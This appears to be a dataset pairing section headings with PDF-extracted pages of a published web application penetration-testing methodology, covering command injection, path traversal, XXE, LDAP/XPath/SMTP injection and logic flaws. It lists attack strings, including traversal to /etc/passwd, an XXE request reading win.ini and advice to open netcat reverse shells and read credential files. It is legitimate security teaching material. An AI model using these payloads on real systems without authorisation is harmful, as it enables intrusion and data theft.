    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 832\n832 Chapter 21 n A Web Application Hacker’s Methodology\n7.3.5.6 If the application allows upload and download of fi les, always probe this\nfunctionality for stored XSS attacks. If the application allows HTML, JAR,\nor text fi les, and does not validate or sanitize their contents, it is almost\ncertainly vulnerable. If it allows JPEG fi les and does not validate that\nthey contain valid images, it is probably vulnerable to attacks against\nInternet Explorer users. Test the application’s handling of each fi le type\nit supports, and confi rm how browsers handle responses containing\nHTML instead of the normal content type.\n7.3.5.7 In every location where data submitted by one user is displayed to other\nusers but where the application’s fi lters prevent you from performing\na stored XSS attack, review whether the application’s behavior leaves\nit vulnerable to on-site request forgery.\n7.4 Test for OS Command Injection\n7.4.1 If any of the command injection attack strings listed in step 7.1.3 resulted\nin an abnormal time delay before the application responded, this is a\nstrong indicator that the application is vulnerable to OS command injec-\ntion. Repeat the test, manually specifying different values in the -i or\n-n parameter, and determine whether the time taken to respond varies\nsystematically with this value.\n7.4.2 Using whichever of the injection strings was found to be successful, try\ninjecting a more interesting command (such as ls or dir), and determine\nwhether you can retrieve the results of the command to your browser.\n7.4.3 If you are unable to retrieve results directly, other options are open to\nyou:\nn You can attempt to open an out-of-band channel back to your com-\nputer. Try using TFTP to copy tools up to the server, using telnet or\nnetcat to create a reverse shell back to your computer, and using the\nmail command to send command output via SMTP.\nn You can redirect the results of your commands to a file within the\nweb root, which you can then retrieve directly using your browser.\nFor example:\ndir > c:\\inetpub\\wwwroot\\foo.txt\n7.4.4 If you fi nd a way to inject commands and retrieve the results, you should\ndetermine your privilege level (by using whoami or a similar command,\nor attempting to write a harmless fi le to a protected directory). You\nmay then seek to escalate privileges, gain backdoor access to sensitive\napplication data, or attack other hosts that can be reached from the\ncompromised server.\ncc2211..iinndddd 883322 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "7.5 Test for Path Traversal",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 833\nChapter 21 n A Web Application Hacker’s Methodology 833\n7.4.5 If you believe that your input is being passed to an OS command of\nsome kind, but the attack strings listed are unsuccessful, see if you can\nuse the < or > character to direct the contents of a fi le to the command’s\ninput or to direct the command’s output to a fi le. This may enable you\nto read or write arbitrary fi le contents. If you know or can guess the\nactual command being executed, try injecting command-line parameters\nassociated with that command to modify its behavior in useful ways\n(for example, by specifying an output fi le within the web root).\n7.4.6 If you fi nd that the application is escaping certain key characters you need\nto perform a command injection attack, try placing the escape character\nbefore each such character. If the application does not escape the escape\ncharacter itself, this usually leads to a bypass of this defensive measure.\nIf you fi nd that whitespace characters are blocked or sanitized, you may\nbe able to use $IFS in place of spaces on UNIX-based platforms.\n7.5 Test for Path Traversal\n7.5.1 For each fuzz test you have performed, review the results generated\nby the path traversal attack strings listed in step 7.1.3. You can click the\ntop of the payload column in Burp Intruder to sort the results table by\npayload and group the results for these strings. For any cases where\nan unusual error message or a response with an abnormal length was\nreceived, review the response manually to determine whether it contains\nthe contents of the specifi ed fi le or other evidence that an anomalous\nfi le operation occurred.\n7.5.2 In your mapping of the application’s attack surface, you should have\nnoted any functionality that specifi cally supports the reading and writ-\ning of fi les on the basis of user-supplied input. In addition to the general\nfuzzing of all parameters, you should manually test this functionality\nvery carefully to identify any path traversal vulnerabilities that exist.\n7.5.3 Where a parameter appears to contain a fi lename, a portion of a fi le-\nname, or a directory, modify the parameter’s existing value to insert an\narbitrary subdirectory and a single traversal sequence. For example, if\nthe application submits this parameter:\nfile=foo/file1.txt\ntry submitting this value:\nfile=foo/bar/../file1.txt\nIf the application’s behavior is identical in the two cases, it may be\nvulnerable, and you should proceed to the next step. If the behavior\nis different, the application may be blocking, stripping, or sanitizing\ncc2211..iinndddd 883333 88//1199//22001111 1122::2222::0044 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 834\n834 Chapter 21 n A Web Application Hacker’s Methodology\ntraversal sequences, resulting in an invalid fi le path. Try using the\nencoding and other attacks described in Chapter 10 in an attempt to\nbypass the fi lters.\n7.5.4 If the preceding test of using traversal sequences within the base\ndirectory is successful, try using additional sequences to step above\nthe base directory and access known fi les on the server’s operating\nsystem. If these attempts fail, the application may be imposing vari-\nous fi lters or checks before fi le access is granted. You should probe\nfurther to understand the controls that are implemented and whether\nany bypasses exist.\n7.5.5 The application may be checking the fi le extension being requested\nand allowing access to only certain kinds of fi les. Try using a null byte\nor newline attack together with a known accepted fi le extension in an\nattempt to bypass the fi lter. For example:\n../../../../../boot.ini%00.jpg\n../../../../../etc/passwd%0a.jpg\n7.5.6 The application may be checking that the user-supplied fi le path starts with\na particular directory or stem. Try appending traversal sequences after\na known accepted stem in an attempt to bypass the fi lter. For example:\n/images/../../../../../../../etc/passwd\n7.5.7 If these attacks are unsuccessful, try combining multiple bypasses,\nworking initially entirely within the base directory in an attempt to\nunderstand the fi lters in place and the ways in which the application\nhandles unexpected input.\n7.5.8 If you succeed in gaining read access to arbitrary fi les on the server,\nattempt to retrieve any of the following fi les, which may enable you to\nescalate your attack:\nn Password files for the operating system and application\nn Server and application configuration files, to discover other vulner-\nabilities or fine-tune a different attack\nn Include files that may contain database credentials\nn Data sources used by the application, such as MySQL database files\nor XML files\nn The source code to server-executable pages, to perform a code review\nin search of bugs\nn Application log files that may contain information such as usernames\nand session tokens\ncc2211..iinndddd 883344 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "7.7 Test for File Inclusion",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 835\nChapter 21 n A Web Application Hacker’s Methodology 835\n7.5.9 If you succeed in gaining write access to arbitrary fi les on the server,\nexamine whether any of the following attacks are feasible in order to\nescalate your attack:\nn Creating scripts in users’ startup folders\nn Modifying files such as in.ftpd to execute arbitrary commands when\na user next connects\nn Writing scripts to a web directory with execute permissions and call-\ning them from your browser\n7.6 Test for Script Injection\n7.6.1 For each fuzz test you have performed, review the results for the string\n111111 on its own (that is, not preceded by the rest of the test string).\nYou can quickly identify these in Burp Intruder by Shift-clicking the\nheading for the 111111 Grep string to group all the results containing\nthis string. Look for any that do not have a check in the Payload Grep\ncolumn. Any cases identifi ed are likely to be vulnerable to injection of\nscripting commands.\n7.6.2 Review all the test cases that used script injection strings, and identify\nany containing scripting error messages that may indicate that your input\nis being executed but caused an error. These may need to be fi ne-tuned\nto perform successful script injection.\n7.6.3 If the application appears to be vulnerable, verify this by injecting fur-\nther commands specifi c to the scripting platform in use. For example,\nyou can use attack payloads similar to those used when fuzzing for OS\ncommand injection:\nsystem(‘ping%20127.0.0.1’)\n7.7 Test for File Inclusion\n7.7.1 If you received any incoming HTTP connections from the target appli-\ncation’s infrastructure during your fuzzing, the application is almost\ncertainly vulnerable to remote fi le inclusion. Repeat the relevant tests\nin a single-threaded and time-throttled way to determine exactly which\nparameters are causing the application to issue the HTTP requests.\n7.7.2 Review the results of the fi le inclusion test cases, and identify any that\ncaused an anomalous delay in the application’s response. In these cases,\nit may be that the application itself is vulnerable but that the resulting\nHTTP requests are timing out due to network-level fi lters.\ncc2211..iinndddd 883355 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "8.1 Test for SMTP Injection",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 836\n836 Chapter 21 n A Web Application Hacker’s Methodology\n7.7.3 If you fi nd a remote fi le inclusion vulnerability, deploy a web server\ncontaining a malicious script specifi c to the language you are targeting,\nand use commands such as those used to test for script injection to verify\nthat your script is being executed.\n8 Test for Function-Specifi c Input Vulnerabilities\nIn addition to the input-based attacks targeted in the preceding step, a range\nof vulnerabilities normally manifest themselves only in particular kinds of\nfunctionality. Before proceeding to the individual steps described in this sec-\ntion, you should review your assessment of the application’s attack surface to\nidentify specifi c application functions where these defects are liable to arise,\nand focus your testing on those.\nApplication mapping results\n8.6. Back-end\n8.1. SMTP 8.2. Native 8.3. SOAP 8.4. LDAP 8.5. XPath 8.7. XXE\nrequest\ninjection code flaws injection injection injection injection\ninjection\nFigure 21-9: Testing for functionality-specific input vulnerabilities\n8.1 Test for SMTP Injection\n8.1.1 For each request employed in e-mail–related functionality, submit each\nof the following test strings as each parameter in turn, inserting your\nown e-mail address at the relevant position. You can use Burp Intruder\nto automate this, as described in step 7.1 for general fuzzing. These test\nstrings already have special characters URL-encoded, so do not apply\nany additional encoding to them.\n<youremail>%0aCc:<youremail>\n<youremail>%0d%0aCc:<youremail>\n<youremail>%0aBcc:<youremail>\n<youremail>%0d%0aBcc:<youremail>\n%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>\ncc2211..iinndddd 883366 88//1199//22001111 1122::2222::0044 PPMM"
  },
  {
    "input": "8.2 Test for Native Software Vulnerabilities",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 837\nChapter 21 n A Web Application Hacker’s Methodology 837\n%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo\n%0a%2e%0a\n%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT\n+TO:+\n<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>\n%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a\n8.1.2 Review the results to identify any error messages the application returns.\nIf these appear to relate to any problem in the e-mail function, investigate\nwhether you need to fi ne-tune your input to exploit a vulnerability.\n8.1.3 Monitor the e-mail address you specifi ed to see if any e-mail messages\nare received.\n8.1.4 Review closely the HTML form that generates the relevant request. It\nmay contain clues regarding the server-side software being used. It\nmay also contain a hidden or disabled fi eld that is used to specify the\nTo address of the e-mail, which you can modify directly.\n8.2 Test for Native Software Vulnerabilities\n8.2.1 Test for Buffer Overfl ows\n8.2.1.1 For each item of data being targeted, submit a range of long strings with\nlengths somewhat longer than common buffer sizes. Target one item of\ndata at a time to maximize the coverage of code paths in the application.\nYou can use the character blocks payload source in Burp Intruder to\nautomatically generate payloads of various sizes. The following buffer\nsizes are suitable to test:\n1100\n4200\n33000\n8.2.1.2 Monitor the application’s responses to identify any anomalies. An uncon-\ntrolled overfl ow is almost certain to cause an exception in the applica-\ntion, although diagnosing the nature of the problem remotely may be\ndiffi cult. Look for any of the following anomalies:\nn An HTTP 500 status code or error message, where other malformed\n(but not overlong) input does not have the same effect\nn An informative message indicating that a failure occurred in some\nexternal, native code component\nn A partial or malformed response being received from the server\nn The TCP connection to the server closing abruptly without returning\na response\ncc2211..iinndddd 883377 88//1199//22001111 1122::2222::0055 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 838\n838 Chapter 21 n A Web Application Hacker’s Methodology\nn The entire web application no longer responding\nn Unexpected data being returned by the application, possibly indicat-\ning that a string in memory has lost its null terminator\n8.2.2 Test for Integer Vulnerabilities\n8.2.2.1 When dealing with native code components, identify any integer-based\ndata, particularly length indicators, which may be used to trigger integer\nvulnerabilities.\n8.2.2.2 Within each targeted item, send suitable payloads designed to trigger\nany vulnerabilities. For each item of data being targeted, send a series\nof different values in turn, representing boundary cases for the signed\nand unsigned versions of different sizes of integer. For example:\nn 0x7f and 0x80 (127 and 128)\nn 0xff and 0x100 (255 and 256)\nn 0x7ffff and 0x8000 (32767 and 32768)\nn 0xffff and 0x10000 (65535 and 65536)\nn 0x7fffffff and 0x80000000 (2147483647 and 2147483648)\nn 0xffffffff and 0x0 (4294967295 and 0)\n8.2.2.3 When the data being modifi ed is represented in hexadecimal form, send\nboth little-endian and big-endian versions of each test case, such as ff7f\nand 7fff. If hexadecimal numbers are submitted in ASCII form, use\nthe same case as the application itself uses for alphabetic characters to\nensure that these are decoded correctly.\n8.2.2.4 Monitor the application’s responses for anomalous events, as described\nin step 8.2.1.2.\n8.2.3 Test for Format String Vulnerabilities\n8.2.3.1 Targeting each parameter in turn, submit strings containing long sequences\nof different format specifi ers. For example:\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...\n%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...\nRemember to URL-encode the % character as %25.\n8.2.3.2 Monitor the application’s responses for anomalous events, as described\nin step 8.2.1.2.\ncc2211..iinndddd 883388 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "8.4 Test for LDAP Injection",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 839\nChapter 21 n A Web Application Hacker’s Methodology 839\n8.3 Test for SOAP Injection\n8.3.1 Target each parameter in turn that you suspect is being processed via\na SOAP message. Submit a rogue XML closing tag, such as </foo>. If\nno error occurs, your input is probably not being inserted into a SOAP\nmessage or is being sanitized in some way.\n8.3.2 If an error was received, submit instead a valid opening and closing\ntag pair, such as <foo></foo>. If this causes the error to disappear, the\napplication may be vulnerable.\n8.3.3 If the item you submit is copied back into the application’s responses,\nsubmit the following two values in turn. If you fi nd that either item is\nreturned as the other, or as simply test, you can be confi dent that your\ninput is being inserted into an XML-based message.\ntest<foo/>\ntest<foo></foo>\n8.3.4 If the HTTP request contains several parameters that may be being\nplaced into a SOAP message, try inserting the opening comment char-\nacter<!-- into one parameter and the closing comment character !-->\ninto another parameter. Then switch these (because you have no way\nof knowing in which order the parameters appear). This can have the\neffect of commenting out a portion of the server’s SOAP message, which\nmay change the application’s logic or result in a different error condition\nthat may divulge information.\n8.4 Test for LDAP Injection\n8.4.1 In any functionality where user-supplied data is used to retrieve infor-\nmation from a directory service, target each parameter in turn to test\nfor potential injection into an LDAP query.\n8.4.2 Submit the * character. If a large number of results are returned, this is\na good indicator that you are dealing with an LDAP query.\n8.4.3 Try entering a number of closing parentheses:\n))))))))))\nThis input invalidates the query syntax, so if an error or other anomalous\nbehavior results, the application may be vulnerable (although many\nother application functions and injection situations may behave in the\nsame way).\n8.4.4 Try entering various expressions designed to interfere with different\ntypes of queries, and see if these allow you to infl uence the results being\ncc2211..iinndddd 883399 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "8.5 Test for XPath Injection",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 840\n840 Chapter 21 n A Web Application Hacker’s Methodology\nreturned. The cn attribute is supported by all LDAP implementations\nand is useful if you do not know any details about the directory you are\nquerying:\n)(cn=*\n*))(|(cn=*\n*))%00\n8.4.5 Try adding extra attributes to the end of your input, using commas to\nseparate each item. Test each attribute in turn. An error indicates that\nthe attribute is not valid in the present context. The following attributes\nare commonly used in directories queried by LDAP:\ncn\nc\nmail\ngivenname\no\nou\ndc\nl\nuid\nobjectclass\npostaladdress\ndn\nsn\n8.5 Test for XPath Injection\n8.5.1 Try submitting the following values, and determine whether they result\nin different application behavior without causing an error:\n‘ or count(parent::*[position()=1])=0 or ‘a’=’b\n‘ or count(parent::*[position()=1])>0 or ‘a’=’b\n8.5.2 If the parameter is numeric, also try the following test strings:\n1 or count(parent::*[position()=1])=0\n1 or count(parent::*[position()=1])>0\n8.5.3 If any of the preceding strings causes differential behavior within the\napplication without causing an error, it is likely that you can extract\narbitrary data by crafting test conditions to extract 1 byte of information\nat a time. Use a series of conditions with the following form to determine\nthe name of the current node’s parent:\nsubstring(name(parent::*[position()=1]),1,1)=’a’\ncc2211..iinndddd 884400 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "8.7 Test for XXE Injection",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 841\nChapter 21 n A Web Application Hacker’s Methodology 841\n8.5.4 Having extracted the name of the parent node, use a series of conditions\nwith the following form to extract all the data within the XML tree:\nsubstring(//parentnodename[position()=1]/child::node()[position()=1]\n/text(),1,1)=’a’\n8.6 Test for Back-End Request Injection\n8.6.1 Locate any instance where an internal server name or IP address is\nspecifi ed in a parameter. Submit an arbitrary server and port, and\nmonitor the application for a timeout. Also submit localhost, and\nfi nally your own IP address, monitoring for incoming connections on\nthe port specifi ed.\n8.6.2 Target a request parameter that returns a specifi c page for a specifi c\nvalue, and try to append a new injected parameter using various syntax,\nincluding the following:\n%26foo%3dbar (URL-encoded &foo=bar)\n%3bfoo%3dbar (URL-encoded ;foo=bar)\n%2526foo%253dbar (Double URL-encoded &foo=bar)\nIf the application behaves as if the original parameter were unmodifi ed,\nthere is a chance of HTTP parameter injection vulnerabilities. Attempt\nto attack the back-end request by injecting known parameter name/\nvalue pairs that may alter the back-end logic, as described in Chapter 10.\n8.7 Test for XXE Injection\n8.7.1 If users are submitting XML to the server, an external entity injection\nattack may be possible. If a fi eld is known that is returned to the user,\nattempt to specify an external entity, as in the following example:\nPOST /search/128/AjaxSearch.ashx HTTP/1.1\nHost: mdsec.net\nContent-Type: text/xml; charset=UTF-8\nContent-Length: 115\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///windows/win.ini” > ]>\n<Search><SearchTerm>&xxe;</SearchTerm></Search>\nIf no known field can be found, specify an external entity of\n“http://192.168.1.1:25” and monitor the page response time. If the\npage takes signifi cantly longer to return or times out, it may be vulnerable.\ncc2211..iinndddd 884411 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "9.2 Test Multistage Processes",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 842\n842 Chapter 21 n A Web Application Hacker’s Methodology\n9 Test for Logic Flaws\n9.1. Identify key attack surface\n9.2. 9.3. 9.4. 9.5.\nMultistage Incomplete Trust Transaction\nprocesses input boundaries logic\nFigure 21-10: Testing for logic flaws\n9.1 Identify the Key Attack Surface\n9.1.1 Logic fl aws can take a huge variety of forms and exist within any aspect\nof the application’s functionality. To ensure that probing for logic fl aws\nis feasible, you should fi rst narrow down the attack surface to a reason-\nable area for manual testing.\n9.1.2 Review the results of your application mapping exercises, and identify\nany instances of the following features:\nn Multistage processes\nn Critical security functions, such as login\nn Transitions across trust boundaries (for example, moving from being\nanonymous to being self-registered to being logged in)\nn Context-based functionality presented to a user\nn Checks and adjustments made to transaction prices or quantities\n9.2 Test Multistage Processes\n9.2.1 When a multistage process involves a defi ned sequence of requests,\nattempt to submit these requests out of the expected sequence. Try\nskipping certain stages, accessing a single stage more than once, and\naccessing earlier stages after later ones.\n9.2.2 The sequence of stages may be accessed via a series of GET or POST\nrequests for distinct URLs, or they may involve submitting different\nsets of parameters to the same URL. You may specify the stage being\ncc2211..iinndddd 884422 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "9.3 Test Handling of Incomplete Input",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 843\nChapter 21 n A Web Application Hacker’s Methodology 843\nrequested by submitting a function name or index within a request\nparameter. Be sure to understand fully the mechanisms that the applica-\ntion is employing to deliver access to distinct stages.\n9.2.3 In addition to interfering with the sequence of steps, try taking param-\neters that are submitted at one stage of the process and submitting them\nat a different stage. If the relevant items of data are updated within the\napplication’s state, you should investigate whether you can leverage\nthis behavior to interfere with the application’s logic.\n9.2.4 If a multistage process involves different users performing operations\non the same set of data, try taking each parameter submitted by one user\nand submitting it as another. If they are accepted and processed as that\nuser, explore the implications of this behavior, as described previously.\n9.2.5 From the context of the functionality that is implemented, try to under-\nstand what assumptions the developers may have made and where the\nkey attack surface lies. Try to identify ways of violating those assump-\ntions to cause undesirable behavior within the application.\n9.2.6 When multistage functions are accessed out of sequence, it is common\nto encounter a variety of anomalous conditions within the application,\nsuch as variables with null or uninitialized values, partially defi ned or\ninconsistent state, and other unpredictable behavior. Look for inter-\nesting error messages and debug output, which you can use to better\nunderstand the application’s internal workings and thereby fi ne-tune\nthe current or a different attack.\n9.3 Test Handling of Incomplete Input\n9.3.1 For critical security functions within the application, which involve\nprocessing several items of user input and making a decision based on\nthese, test the application’s resilience to requests containing incomplete\ninput.\n9.3.2 For each parameter in turn, remove both the name and value of the\nparameter from the request. Monitor the application’s responses for\nany divergence in its behavior and any error messages that shed light\non the logic being performed.\n9.3.3 If the request you are manipulating is part of a multistage process, follow\nthe process through to completion, because the application may store\ndata submitted in earlier stages within the session and then process this\nat a later stage.\ncc2211..iinndddd 884433 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "9.5 Test Transaction Logic",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 844\n844 Chapter 21 n A Web Application Hacker’s Methodology\n9.4 Test Trust Boundaries\n9.4.1 Probe how the application handles transitions between different types\nof trust of the user. Look for functionality where a user with a given\ntrust status can accumulate an amount of state relating to his identity.\nFor example, an anonymous user could provide personal information\nduring self-registration, or proceed through part of an account recovery\nprocess designed to establish his identity.\n9.4.2 Try to fi nd ways to make improper transitions across trust boundaries\nby accumulating relevant state in one area and then switching to a\ndifferent area in a way that would not normally occur. For example,\nhaving completed part of an account recovery process, attempt to\nswitch to an authenticated user-specifi c page. Test whether the appli-\ncation assigns you an inappropriate level of trust when you transition\nin this way.\n9.4.3 Try to determine whether you can harness any higher-privileged func-\ntion directly or indirectly to access or infer information.\n9.5 Test Transaction Logic\n9.5.1 In cases where the application imposes transaction limits, test the\neffects of submitting negative values. If these are accepted, it may be\npossible to beat the limits by making large transactions in the opposite\ndirection.\n9.5.2 Examine whether you can use a series of successive transactions to bring\nabout a state that you can exploit for a useful purpose. For example, you\nmay be able to perform several low-value transfers between accounts\nto accrue a large balance that the application’s logic was intended to\nprevent.\n9.5.3 If the application adjusts prices or other sensitive values based on criteria\nthat are determined by user-controllable data or actions, fi rst understand\nthe algorithms used by the application, and the point within its logic\nwhere adjustments are made. Identify whether these adjustments are\nmade on a one-time basis, or whether they are revised in response to\nfurther actions performed by the user.\n9.5.4 Try to fi nd ways to manipulate the application’s behavior to cause it to\nget into a state where the adjustments it has applied do not correspond\nto the original criteria intended by its designers.\ncc2211..iinndddd 884444 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "10.2 Test Segregation Between ASP-Hosted Applications",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 845\nChapter 21 n A Web Application Hacker’s Methodology 845\n10 Test for Shared Hosting Vulnerabilities\n10.1. Test segregation in shared infrastructures\n10.2. Test segregation between ASP-hosted applications\nFigure 21-11: Testing for shared hosting vulnerabilities\n10.1 Test Segregation in Shared Infrastructures\n10.1.1 If the application is hosted in a shared infrastructure, examine the access\nmechanisms provided for customers of the shared environment to update\nand manage their content and functionality. Consider the following\nquestions:\nn Does the remote access facility use a secure protocol and suitably\nhardened infrastructure?\nn Can customers access files, data, and other resources that they do not\nlegitimately need to access?\nn Can customers gain an interactive shell within the hosting environ-\nment and execute arbitrary commands?\n10.1.2 If a proprietary application is used to allow customers to confi gure and\ncustomize a shared environment, consider targeting this application as\na way to compromise the environment itself and individual applications\nrunning within it.\n10.1.3 If you can achieve command execution, SQL injection, or arbitrary fi le\naccess within one application, investigate carefully whether this provides\nany way to escalate your attack to target other applications.\n10.2 Test Segregation Between ASP-Hosted Applications\n10.2.1 If the application belongs to an ASP-hosted service composed of a\nmix of shared and customized components, identify any shared com-\nponents such as logging mechanisms, administrative functions, and\ndatabase code components. Attempt to leverage these to compromise\nthe shared portion of the application and thereby attack other individual\napplications.\ncc2211..iinndddd 884455 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "11.1 Test for Default Credentials",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 846\n846 Chapter 21 n A Web Application Hacker’s Methodology\n10.2.2 If a common database is used within any kind of shared environment,\nperform a comprehensive audit of the database confi guration, patch level,\ntable structure, and permissions using a database scanning tool such as\nNGSSquirrel. Any defects within the database security model may pro-\nvide a way to escalate an attack from within one application to another.\n11 Test for Application Server Vulnerabilities\n11.1. Test for default credentials\n11.2. Test for default content\n11.3. Test for dangerous HTTP methods\n11.4. Test for proxy functionality\n11.5. Test for virtual hosting misconfiguration\n11.6. Test for web server software bugs\n11.7. Test for web application firewalling\nFigure 21-12: Testing for web server vulnerabilities\n11.1 Test for Default Credentials\n11.1.1 Review the results of your application mapping exercises to identify the\nweb server and other technologies in use that may contain accessible\nadministrative interfaces.\n11.1.2 Perform a port scan of the web server to identify any administrative\ninterfaces running on a different port than the main target application.\n11.1.3 For any identifi ed interfaces, consult the manufacturer’s documentation\nand common default password listings to obtain default credentials.\n11.1.4 If the default credentials do not work, use the steps listed in section 4\nto attempt to guess valid credentials.\n11.1.5 If you gain access to an administrative interface, review the available\nfunctionality and determine whether it can be used to further compro-\nmise the host and attack the main application.\ncc2211..iinndddd 884466 88//1199//22001111 1122::2222::0055 PPMM"
  },
  {
    "input": "11.5 Test for Virtual Hosting Misconfiguration",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 847\nChapter 21 n A Web Application Hacker’s Methodology 847\n11.2 Test for Default Content\n11.2.1 Review the results of your Nikto scan (step 1.4.1) to identify any default\ncontent that may be present on the server but that is not an integral part\nof the application.\n11.2.2 Use search engines and other resources such as www.exploit-db.com and\nwww.osvdb.org to identify default content and functionality included\nwithin the technologies you know to be in use. If feasible, carry out a\nlocal installation of these, and review them for any default functionality\nthat you may be able to leverage in your attack.\n11.2.3 Examine the default content for any functionality or vulnerabilities that\nyou may be able to leverage to attack the server or the application.\n11.3 Test for Dangerous HTTP Methods\n11.3.1 Use the OPTIONS method to list the HTTP methods that the server states\nare available. Note that different methods may be enabled in different\ndirectories. You can perform a vulnerability scan in Paros to perform\nthis check.\n11.3.2 Try each reported method manually to confi rm whether it can in fact be\nused.\n11.3.3 If you fi nd that some WebDAV methods are enabled, use a WebDAV-\nenabled client for further investigation, such as Microsoft FrontPage or\nthe Open as Web Folder option in Internet Explorer.\n11.4 Test for Proxy Functionality\n11.4.1 Using both GET and CONNECT requests, try to use the web server as a\nproxy to connect to other servers on the Internet and retrieve content\nfrom them.\n11.4.2 Using both GET and CONNECT requests, attempt to connect to different IP\naddresses and ports within the hosting infrastructure.\n11.4.3 Using both GET and CONNECT requests, attempt to connect to common\nport numbers on the web server itself by specifying 127.0.0.1 as the target\nhost in the request.\n11.5 Test for Virtual Hosting Misconfi guration\n11.5.1 Submit GET requests to the root directory using the following:\nn The correct Host header\nn A bogus Host header\ncc2211..iinndddd 884477 88//1199//22001111 1122::2222::0066 PPMM"
  },
  {
    "input": "11.7 Test for Web Application Firewalling",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 848\n848 Chapter 21 n A Web Application Hacker’s Methodology\nn The server’s IP address in the Host header\nn NoHost header (use HTTP/1.0 only)\n11.5.2 Compare the responses to these requests. A common result is that direc-\ntory listings are obtained when the server’s IP address is used in the Host\nheader. You may also fi nd that different default content is accessible.\n11.5.3 If you observe different behavior, repeat the application mapping exer-\ncises described in section 1 using the hostname that generated different\nresults. Be sure to perform a Nikto scan using the -vhost option to iden-\ntify any default content that may have been overlooked during initial\napplication mapping.\n11.6 Test for Web Server Software Bugs\n11.6.1 Run Nessus and any other similar scanners you have available to identify\nany known vulnerabilities in the web server software you are attacking.\n11.6.2 Review resources such as Security Focus, Bugtraq, and Full Disclosure\nto fi nd details of any recently discovered vulnerabilities that may not\nhave been fi xed on your target.\n11.6.3 If the application was developed by a third party, investigate whether it\nships with its own web server (often an open source server). If it does,\ninvestigate this for any vulnerabilities. Be aware that in this case, the\nserver’s standard banner may have been modifi ed.\n11.6.4 If possible, consider performing a local installation of the software you\nare attacking, and carry out your own testing to fi nd new vulnerabilities\nthat have not been discovered or widely circulated.\n11.7 Test for Web Application Firewalling\n11.7.1 Submit an arbitrary parameter name to the application with a clear attack\npayload in the value, ideally somewhere the application includes the\nname and/or value in the response. If the application blocks the attack,\nthis is likely to be due to an external defense.\n11.7.2 If a variable can be submitted that is returned in a server response, submit\na range of fuzz strings and encoded variants to identify the behavior of\nthe application defenses to user input.\n11.7.3 Confi rm this behavior by performing the same attacks on variables\nwithin the application.\n11.7.4 For all fuzzing strings and requests, use payload strings that are unlikely\nto exist in a standard signature database. Although giving examples of\ncc2211..iinndddd 884488 88//1199//22001111 1122::2222::0066 PPMM"
  },
  {
    "input": "12.1 Check for DOM-Based Attacks",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 849\nChapter 21 n A Web Application Hacker’s Methodology 849\nthese is by defi nition impossible, avoid using /etc/passwd or /windows/\nsystem32/config/sam as payloads for fi le retrieval. Also avoid using\nterms such as <script> in an XSS attack and using alert() or xss as\nXSS payloads.\n11.7.5 If a particular request is blocked, try submitting the same parameter in a\ndifferent location or context. For instance, submit the same parameter in\nthe URL in a GET request, within the body of a POST request, and within\nthe URL in a POST request.\n11.7.6 On ASP.NET, also try submitting the parameter as a cookie. The API\nRequest.Params[“foo”] will retrieve the value of a cookie named foo\nif the parameter foo is not found in the query string or message body.\n11.7.7 Review all the other methods of introducing user input provided in\nChapter 4, picking any that are not protected.\n11.7.8 Determine locations where user input is (or can be) submitted in a non-\nstandard format such as serialization or encoding. If none is available,\nbuild the attack string by concatenation and/or by spanning it across\nmultiple variables. (Note that if the target is ASP.NET, you may be able\nto use HPP to concatenate the attack using multiple specifi cations of the\nsame variable.)\n12 Miscellaneous Checks\n12.1. Test for DOM-based attacks\n12.2. Test for local privacy vulnerabilities\n12.3. Test for weak SSL ciphers\n12.4. Check same-orgin policy configuration\nFigure21-13: Miscellaneous checks\n12.1 Check for DOM-Based Attacks\n12.1.1 Perform a brief code review of every piece of JavaScript received from\nthe application. Identify any XSS or redirection vulnerabilities that can\nbe triggered by using a crafted URL to introduce malicious data into\nthe DOM of the relevant page. Include all standalone JavaScript fi les\ncc2211..iinndddd 884499 88//1199//22001111 1122::2222::0066 PPMM"
  },
  {
    "input": "12.2 Check for Local Privacy Vulnerabilities",
